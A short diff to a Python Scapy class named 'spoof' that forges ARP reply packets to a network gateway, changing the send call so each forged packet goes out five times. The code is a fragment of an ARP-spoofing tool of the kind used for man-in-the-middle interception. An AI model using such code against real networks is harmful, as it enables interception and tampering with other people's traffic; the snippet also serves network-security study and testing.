@@ -24,7 +24,7 @@ class spoof():
         
         ether_to_router=Ether(dst=self.gateway_mac)
         packet_to_router_arp=ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
-        sendp(ether_to_router/packet_to_router_arp, verbose=False)
+        sendp(ether_to_router/packet_to_router_arp, verbose=False, count=5)
     
             
             
